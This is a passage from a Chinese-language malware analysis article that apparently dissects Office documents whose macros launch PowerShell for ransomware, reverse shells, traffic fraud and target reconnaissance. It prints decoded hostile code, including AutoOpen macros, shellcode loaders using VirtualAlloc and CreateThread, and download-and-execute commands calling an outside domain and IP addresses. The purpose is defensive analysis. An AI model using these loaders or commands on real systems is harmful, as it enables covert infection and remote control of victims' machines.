+<p><b>3. 得到磁盘中的所有的指定后缀的文件</b></p>
+<p>调用Get-PSDrive，得到所有文件名</p>
+<blockquote><p>$folder= gdr|where {$_.Free}|Sort-Object -Descending</p></blockquote>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603518164155.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603518164155.jpg!small"  alt="5.jpg" width="651" /></a></p>
+<p><b>4. 加密这些文件的前2048个字节后写回文件</b></p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603518507316.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603518507316.jpg!small"  alt="6.jpg" width="646" /></a></p>
+<p><b>5. 解码Base64得到提示勒索的html文件</b></p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/1460351898342.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/1460351898342.jpg!small"  alt="7.jpg" width="658" /></a></p>
+<p>在html文件的尾部添加上赎回密钥用的UUID及当前时间</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603519072245.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603519072245.jpg!small"  alt="8.jpg" width="682" /></a></p>
+<h3><span class="ez-toc-section" id="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"></span>渗透测试<span class="ez-toc-section-end"></span></h3>
+<p>此类样本大多使用网络上的nishang开源工具包生成的攻击文件。攻击文件以Word、Excel、CHM、LNK等格式的文件为载体，嵌入Payload，实现获得反弹Shell等功能，实现对系统的控制。</p>
+<blockquote><p>样本MD5：929d104ae3f02129bbf9fa3c5cb8f7a1</p></blockquote>
+<p>文件打开后，会显示文件损坏，用来迷惑用户，Word中的宏却悄然运行了。</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/1460351940263.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/1460351940263.jpg!small"  alt="11.jpg" width="636" /></a></p>
+<p>宏的内容为：</p>
+<blockquote><p>Sub AutoOpen()</p>
+<p>Dim x</p>
+<p>x = “powershell -window hidden -enc JAAxACA[……]APQA” _</p>
+<p>&amp; “wB3AGUAcgBzAGgAZQBsAGwAIAAkADIAIAAkAGUAIgA7AH0A”</p>
+<p>Shell (“POWERSHELL.EXE ” &amp; x)</p>
+<p>Dim title As String</p>
+<p>title = “Critical Microsoft Office Error”</p>
+<p>Dim msg As String</p>
+<p>Dim intResponse As Integer</p>
+<p>msg = “This document appears to be corrupt or missing critical rows in order to restore. Please restore this file from a backup.”</p>
+<p>intResponse = MsgBox(msg, 16, title)</p>
+<p>Application.Quit</p>
+<p>End Sub</p></blockquote>
+<p>将宏中的字符串，用Base64解码后，得到内容如下：</p>
+<pre><code class="hljs markdown">$1 = '$c = ''[<span class="hljs-string">DllImport("kernel32.dll")</span>]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[<span class="hljs-string">DllImport("kernel32.dll")</span>]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[<span class="hljs-string">DllImport("msvcrt.dll")</span>]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[<span class="hljs-string">Byte[</span>]];[<span class="hljs-string">Byte[</span>]]$z = 0xbf,0x34,0xff,0xf9,0x18,0xd9,0xeb,0xd9,0x74,[<span class="hljs-string">……</span>] ,0xda,0x73,0x5d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([<span class="hljs-string">IntPtr</span>](<span class="hljs-link">$x.ToInt32(</span>)+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "&amp; $3 $2 $e"}else{;iex "&amp; powershell $2 $e";}</code></pre>
+<p>将其中的shellcode提取出来进行分析得知，这段shellcode的主要功能是反向连接内网IP 192.168.1.30的4444端口。</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603519808238.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603519808238.jpg!small"  alt="22.jpg" width="623" /></a></p>
+<p>另一个与上述样本有着类似功能的样本的MD5为：1e39753fd56f17010ac62b1d84b5e650</p>
+<p>从文件中提取出来的宏为：</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603520068323.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603520068323.jpg!small"  alt="33.jpg" width="282" /></a></p>
+<p>而这四个函数对应的功能分别为</p>
+<p><b>Execute：</b></p>
+<p>用Powershell下载invoke-shellcode.ps后，通过invoke-shellcode函数调用指定Payload windows/meterpreter/reverse_https 建立反弹shell，反弹的地址为98.100.108.133，端口为443</p>
+<p>其中部分代码为：</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603520773215.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603520773215.jpg!small"  alt="44.jpg" width="712.5" /></a></p>
+<p><b>Persist：</b></p>
+<p>将Powershell建立反弹Shell的功能用VBS实现后，保存在C:\Users\Public\10-D.vbs文件中</p>
+<p><b>Reg</b></p>
+<p>新建HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load注册表，值指定为C:\Users\Public\10-D.vbs</p>
+<p><b>Start</b></p>
+<p>调用C:\Users\Public\10-D.vbs</p>
+<p>而有时，为了抵抗杀毒软件的追杀，样本通常会进行Base64编码。</p>
+<blockquote><p>MD5：c49ee3fb4897dd1cdab1d0ae4fe55988</p></blockquote>
+<p>下面为提取出来的宏内容，可见代码使用了Base64编码：</p>
+<pre><code class="hljs python"> <span class="hljs-string">"vba_code"</span>: <span class="hljs-string">"Sub Workbook_Open() 'VBA arch detect suggested by "</span>T<span class="hljs-string">" Dim Command As String Dim str As String Dim exec As String Arch = Environ("</span>PROCESSOR_ARCHITECTURE<span class="hljs-string">") windir = Environ("</span>windi<span class="hljs-string">r") If Arch = "</span>AMD64<span class="hljs-string">" Then Command = windir + "</span>\syswow64\windowspowershell\v1<span class="hljs-number">.0</span>\powershell.exe<span class="hljs-string">" Else Command = "</span>powershell.exe<span class="hljs-string">" End If str = "</span>nVRtb9tGDP7uX0EIN0BCLEV+aZZYCNDUadZsdZrFbtLNMIazRFvXnO<span class="hljs-string">" str = str + "</span><span class="hljs-number">6</span>U08mR4/q/j3I0x/<span class="hljs-number">06</span>f9CZFI/PQ/Kh2BOcw3unNb2U8jrLt<span class="hljs-string">b"[……]str = str + "</span>TjdLP9Fw==<span class="hljs-string">" exec = Command + "</span> -NoP -NonI -W Hidden -Exec Bypass -Comm<span class="hljs-string">" exec = exec + "</span><span class="hljs-keyword">and</span> <span class="hljs-string">""</span>Invoke-Expression $(New-Object IO.StreamRea<span class="hljs-string">" exec = exec + "</span></code></pre>
+<p>解码后的内容为：</p>
+<p>$q = @&#8221;</p>
+<p>[<span class="hljs-string">DllImport(&#8220;kernel32.dll&#8221;)</span>] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</p>
+<p>[<span class="hljs-string">DllImport(&#8220;kernel32.dll&#8221;)</span>] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpP</p>
+<p>arameter, uint dwCreationFlags, IntPtr lpThreadId);</p>
+<p>&#8220;@</p>
+<p>try{$d = &#8220;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#8221;.ToCharArray()</p>
+<p>function c($v){ return (([<span class="hljs-string">int[</span>]] $v.ToCharArray() | Measure-Object -Sum).Sum % 0x100 -eq 92)}</p>
+<p>function t {$f = &#8220;&#8221;;1..3|foreach-object{$f+= $d[<span class="hljs-string">(get-random -maximum $d.Length)</span>]};return $f;}</p>
+<p>function e { process {[<span class="hljs-string">array</span>]$x = $x + $_}; end {$x | sort-object {(new-object Random).next()}}}</p>
+<p>function g{ for ($i=0;$i -lt 64;$i++){$h = t;$k = $d | e;  foreach ($l in $k){$s = $h + $l; if (c($s)) { return $s }}}return &#8220;9vXU&#8221;;}</p>
+<p>[<span class="hljs-string">Net.ServicePointManager</span>]::ServerCertificateValidationCallback = {$true};$m = New-Object System.Net.WebClient;</p>
+<p>$m.Headers.Add(&#8220;user-agent&#8221;, &#8220;Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)&#8221;);$n = g; [<span class="hljs-string">Byte[</span>]] $p = $m.DownloadData(&#8220;<a href="https://192.168.0.105:4444/">https://192.168.0.105:4444/</a>$n</p>
+<p>&#8221; )</p>
+<p>$o = Add-Type -memberDefinition $q -Name &#8220;Win32&#8221; -namespace Win32Functions -passthru</p>
+<p>$x=$o::VirtualAlloc(0,$p.Length,0x3000,0x40);[<span class="hljs-string">System.Runtime.InteropServices.Marshal</span>]::Copy($p, 0, [<span class="hljs-string">IntPtr</span>](<span class="hljs-link">$x.ToInt32(</span>)), $p.Length)</p>
+<p>$o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}</p>
+<p>脚本的功能是通过g函数随机生成四位的字符，从内网网址下载后加载执行<a href="https://192.168.0.105:4444/xxxx">https://192.168.0.105:4444/xxxx</a> （其中xxxx为随机四位字符）</p>
+<p>这里连接的是192.168.0.105为内网IP，此样本很可能是渗透者进行内网渗透攻击的测试样本。此类样本还有很多：</p>
+<p>eae0906f98568c5fb25b2bb32b1dbed7</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603521705421.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603521705421.jpg!small"  alt="111.jpg" width="655" /></a></p>
+<p>1a42671ce3b2701956ba49718c9e118e</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603521795946.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603521795946.jpg!small"  alt="222.jpg" width="645" /></a></p>
+<p>496ed16e636203fa0eadbcdc182b0e85</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603521876422.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603521876422.jpg!small"  alt="333.jpg" width="680" /></a></p>
+<p>使用LNK文件，建立反弹shell的样本</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603522171712.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603522171712.jpg!small"  alt="444.jpg" width="674" /></a></p>
+<h3><span class="ez-toc-section" id="%E6%B5%81%E9%87%8F%E6%AC%BA%E9%AA%97"></span>流量欺骗<span class="ez-toc-section-end"></span></h3>
+<p>为了快速提升网站流量、Alexa排名、淘宝网店访问量、博客人气、每日访问IP、PV、UV等，有些网站站长会采取非常规的引流方法，采用软件在后台模拟人正常访问网页的点击动作而达到提升流量的目的。</p>
+<blockquote><p>样本MD5：5f8dc4db8a658b7ba185c2f038f3f075</p></blockquote>
+<p>文档打开后里面只有“test by c”这几个文字</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603522443920.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603522443920.jpg!small"  alt="555.jpg" width="616" /></a></p>
+<p>提取出文档中的宏中的加密字符解密后得到可读的ps脚本如下</p>
+<pre><code class="hljs markdown">$1 = '$c = ''[<span class="hljs-string">DllImport("kernel32.dll")</span>]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[<span class="hljs-string">DllImport("kernel32.dll")</span>]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[<span class="hljs-string">DllImport("msvcrt.dll")</span>]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[<span class="hljs-string">Byte[</span>]];[<span class="hljs-string">Byte[</span>]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,[<span class="hljs-string">……</span>] ,0x31,0x32,0x38,0x2e,0x31,0x39,0x36,0x2e,0x38,0x34,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([<span class="hljs-string">IntPtr</span>](<span class="hljs-link">$x.ToInt32(</span>)+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "&amp; $x86 $cmd $e"}else{$cmd = "-nop -noni -enc";iex "&amp; powershell $cmd $e";}</code></pre>
+<p>可见，ps脚本的主要功能就是执行Shellcode，这段Shellcode的功能就是调用wininet.dll中的函数进行连接138.128.196.84地址的443端口。而138.128.196.84地址正为流量宝类的软件用的地址。</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603522777849.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603522777849.jpg!small"  alt="666.jpg" width="663" /></a></p>
+<h3><span class="ez-toc-section" id="%E6%8E%A2%E6%B5%8B%E6%8E%A7%E5%88%B6"></span>探测控制<span class="ez-toc-section-end"></span></h3>
+<p>样本对通过宏调用Powershell下载PE文件在受影响的系统上检查是否为关心的目标并执行进一步地操作，具备针对性攻击的特点。</p>
+<p>样本MD5：fba6b329876533f28d317e60fe53c8d3</p>
+<p>从样本中抽取出的宏主要是根据系统版本下载相应的文件执行</p>
+<blockquote><p>   Sub AutoOpen()</p>
+<p>x1 = “Download”</p>
+<p>h = “Str”</p>
+<p>o = “power” &amp; “shell” &amp; “.exe”</p>
+<p>Const HIDDEN_WINDOW = 0</p>
+<p>strComputer = “.”</p>
+<p>abcdef = h &amp; “ing”</p>
+<p>Set objWMIService = GetObject(“winmgmts:\\” &amp; strComputer &amp; “\root\cimv2″)</p>
+<p>Set objStartup = objWMIService.Get(“Win32_ProcessStartup”)</p>
+<p>Set objConfig = objStartup.SpawnInstance_</p>
+<p>objConfig.ShowWindow = HIDDEN_WINDOW</p>
+<p>Set objProcess = GetObject(“winmgmts:\\” &amp; strComputer &amp; “\root\cimv2:Win32_Process”)</p>
+<p>objProcess.Create o &amp; ” -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c if ([IntPtr]::size -eq 4) {(new-object Net.WebClient).” &amp; x1 &amp; abcdef &amp; “(‘<a href="http://rabbitons.pw/cache">http://rabbitons.pw/cache</a>‘) | iex } else {(new-object Net.WebClient).” &amp; x1 &amp; abcdef &amp; “(‘<a href="http://rabbitons.pw/css">http://rabbitons.pw/css</a>‘) | iex}”, Null, objConfig, intProcessID</p></blockquote>
+<p>其中的对应32位系统的cache文件的内容如下：</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603523106181.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603523106181.jpg!small"  alt="q.jpg" width="617" /></a></p>
+<p>我们对Shellcode进行简单分析：</p>
+<p><b>1. 在内存中解密，生成一个PE文件，在内存中展开跳到入口点处执行，将PE文件的.BSS区段进行解码，解码算法如下</b>：</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/1460352353435.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/1460352353435.jpg!small"  alt="w.jpg" width="616" /></a></p>
+<p>解密后的结果为：</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603523801835.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603523801835.jpg!small"  alt="e.jpg" width="613" /></a></p>
+<p><b>2.判断是不是64位系统 </b></p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603524169848.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603524169848.jpg!small"  alt="r.jpg" width="613" /></a></p>
+<p>判断虚拟机</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603524553697.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603524553697.jpg!small"  alt="t.jpg" width="615" /></a></p>
+<p><b> 3. 用FindFirstUrlCacheEntry和FindNextUrlCacheEntry遍历IE临时文件目录 ，用于判断用户是否是攻击者的目标用户</b></p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603524936906.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603524936906.jpg!small"  alt="y.jpg" width="617" /></a></p>
+<p><b> 4.计算用户和电脑信息的HASH</b></p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603525218199.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603525218199.jpg!small"  alt="u.jpg" width="616" /></a></p>
+<p>随后B03938处创建线程进行下面的动作</p>
+<p>判断ipconfig -all 命令中是否有.edu、school、hospital、colledge、health、nurse等字符串</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603525734913.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603525734913.jpg!small"  alt="a.jpg" width="613" /></a></p>
+<p>调用cmd /C “”ipconfig -all &gt; C:\DOCUME~1\yyyyy\LOCALS~1\Temp\xxxx.TMP(xxx代表随机数)生成文件，检测.edu、school、hospital、colledge、health、nurse等字符串</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603526091349.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603526091349.jpg!small"  alt="s.jpg" width="616" /></a></p>
+<p><b>5. 遍历系统中的进程，检测有否指定hash的进程正在运行，</b></p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603526402834.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603526402834.jpg!small"  alt="d.jpg" width="593" /></a></p>
+<p>从IE缓存中查找用户是不是访问过这些网址：</p>
+<p>通过WININET.FindFirstUrlCacheEntryW   WININET.FindNextUrlCacheEntryW WININET.FindCloseUrlCache</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603526776391.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603526776391.jpg!small"  alt="f.jpg" width="618" /></a></p>
+<p>得到net view命令返回值中是否有pos、store、shop、sale等字符串</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603527096239.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603527096239.jpg!small"  alt="g.jpg" width="614" /></a></p>
+<p>发送用户信息，并下载相对应的恶意程序：</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603527423980.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603527423980.jpg!small"  alt="h.jpg" width="583" /></a></p>
+<p>其中，用这种手法的恶意样本还有如下：</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603528054875.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603528054875.jpg!small"  alt="j.jpg" width="673" /></a></p>
+<h3><span class="ez-toc-section" id="%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"></span>信息搜集<span class="ez-toc-section-end"></span></h3>
+<p>样本中的宏代码下载执行信息收集类的Powershell脚本，很可能是某些针对性攻击的前导。</p>
+<p>样本MD5：f7c3c7df2e7761eceff991bf457ed5b9</p>
+<p>提取出来的宏代码为：</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603528354549.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603528354549.jpg!small"  alt="k.jpg" width="664" /></a></p>
+<p>下载一个名为Get-Info-2.ps1的脚本，脚本功能是将本机的IP地址、domainname、username、usbid等发送到远端服务器中。</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603528678984.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603528678984.jpg!small"  alt="l.jpg" width="614" /></a></p>
+<h2><span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span></h2>
+<p>天眼实验室再次提醒用户，此类恶意软件主要依赖通过微软的Office文档传播，用户应该确保宏不默认启用，提防任何来自不受信任来源的文件，当打开文件系统提示要使用宏时务必慎重。同时要尽量选用可靠的安全软件进行防范，如无必要不要关闭安全软件，当发现系统出现异常情况，应及时查杀木马，尽可能避免各类恶意代码的骚扰。</p>
+<h2><span class="ez-toc-section" id="%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"></span>参考资料<span class="ez-toc-section-end"></span></h2>
+<p><a href="http://news.softpedia.com/news/powerware-ransomware-abuses-microsoft-word-and-powershell-to-infect-users-502200.shtml">http://news.softpedia.com/news/powerware-ransomware-abuses-microsoft-word-and-powershell-to-infect-users-502200.shtml</a></p>
+<p><a href="https://www.carbonblack.com/2016/03/25/threat-alert-powerware-new-ransomware-written-in-powershell-targets-organizations-via-microsoft-word/">https://www.carbonblack.com/2016/03/25/threat-alert-powerware-new-ransomware-written-in-powershell-targets-organizations-via-microsoft-word/</a></p>
+<p><a href="https://www.10dsecurity.com/">https://www.10dsecurity.com/</a></p>
+<p><b>* 作者：360天眼实验室（企业账号），转载请注明来自FreeBuf黑客与极客（FreeBuf.COM）</b></p>
+<div class='os-share-box'><i onclick="share_button_click('//connect.qq.com/widget/shareqq/index.html?url=%URL%&title=%TITLE%&summary=%SUMMARY%&pics=%PICS%')" title="分享到 QQ" class="os-icon os-share-qq"><svg aria-hidden="true"><use xlink:href="#os-share-qq"></use></svg></i><i onclick="share_button_click('//service.weibo.com/share/share.php?url=%URL%&title=%TITLE%&pic=%PICS%&appkey=2071218786&ralateUid=&language=zh_cn&searchPic=true')" title="分享到 微博" class="os-icon os-share-weibo"><svg aria-hidden="true"><use xlink:href="#os-share-weibo"></use></svg></i><i  title="分享到 微信" class="os-icon os-share-wechat"><svg aria-hidden="true"><use xlink:href="#os-share-wechat"></use></svg></i><i onclick="share_button_click('//sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=%URL%&title=%TITLE%&desc=&summary=%SUMMARY%&site=PowerShell 中文博客&pics=%PICS%')" title="分享到 QQ空间" class="os-icon os-share-qqzone"><svg aria-hidden="true"><use xlink:href="#os-share-qqzone"></use></svg></i><i onclick="share_button_click('//www.douban.com/share/service?href=%URL%&name=%TITLE%&text=%SUMMARY%&image=%PIC%')" title="分享到 豆瓣" class="os-icon os-share-douban"><svg aria-hidden="true"><use xlink:href="#os-share-douban"></use></svg></i><i onclick="share_button_click('//note.youdao.com/memory/?url=%URL%&title=%TITLE%&sumary=%SUMMARY%&pic=%PICS%')" title="分享到 有道云笔记" class="os-icon os-share-youdao"><svg aria-hidden="true"><use xlink:href="#os-share-youdao"></use></svg></i><i onclick="share_button_click('//app.yinxiang.com/clip.action?url=%URL%&title=%TITLE%&image=%PICS%')" title="分享到 印象笔记" class="os-icon os-share-evernote"><svg aria-hidden="true"><use xlink:href="#os-share-evernote"></use></svg></i><i onclick="share_button_click('//www.facebook.com/sharer.php?u=%URL%&amp;t=%TITLE%')" title="分享到 Facebook" class="os-icon os-share-facebook"><svg aria-hidden="true"><use xlink:href="#os-share-facebook"></use></svg></i><i onclick="share_button_click('//twitter.com/home/?status=%TITLE%:%URL%')" title="分享到 Twitter" class="os-icon os-share-twitter"><svg aria-hidden="true"><use xlink:href="#os-share-twitter"></use></svg></i><i onclick="share_button_click('//plus.google.com/share?url=%URL%')" title="分享到 Google+" class="os-icon os-share-google"><svg aria-hidden="true"><use xlink:href="#os-share-google"></use></svg></i><i onclick="share_button_click('//www.reddit.com/submit?url=%URL%&amp;title=%TITLE%')" title="分享到 Reddit" class="os-icon os-share-reddit"><svg aria-hidden="true"><use xlink:href="#os-share-reddit"></use></svg></i></div><div id='os-popup-overlay'></div><div id='os-popup-box' class='os-popup-box'><div id='os-popup-title'><span>×</span><i class="os-icon os-share-wechat"><svg aria-hidden="true"><use xlink:href="#os-share-wechat"></use></svg></i>用微信扫描并分享</div><div 